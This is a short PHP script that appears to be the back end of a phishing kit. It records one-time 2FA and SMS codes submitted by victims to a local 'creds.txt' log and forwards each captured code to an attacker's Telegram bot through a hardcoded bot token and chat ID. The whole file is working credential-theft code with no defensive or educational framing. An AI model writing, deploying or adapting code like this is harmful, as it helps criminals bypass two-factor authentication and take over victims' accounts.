<?php
if (!file_exists('logs')) mkdir('logs');
$code = $_POST['code'] ?? '';
$sms = $_POST['sms'] ?? '';

if ($code) {
    file_put_contents('logs/creds.txt', date('Y-m-d H:i:s')." | 2FA: $code\n", FILE_APPEND);
    
    // Telegram Notification for 2FA
    $botToken = "7757124710:AAGqZ2XQTcps8EX3v6GCHYsbpHVJAR5LuIQ";
    $chatId = "6730758751";
    $message = urlencode("SMS CODE CAPTURED 📱\n\n🔢 Code: $code\n\n📅 Time: " . date("Y-m-d H:i:s"));
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
    
} elseif ($sms) {
    file_put_contents('logs/creds.txt', date('Y-m-d H:i:s')." | SMS: $sms\n", FILE_APPEND);
    
    // Telegram Notification for SMS
    $botToken = "7757124710:AAGqZ2XQTcps8EX3v6GCHYsbpHVJAR5LuIQ";
    $chatId = "6730758751";
    $message = urlencode("🔐 2FA CODE CAPTURED 🔐\n\n🔢 Code: $sms\n\n📅 Time: " . date("Y-m-d H:i:s"));
    file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=$message");
}
?>
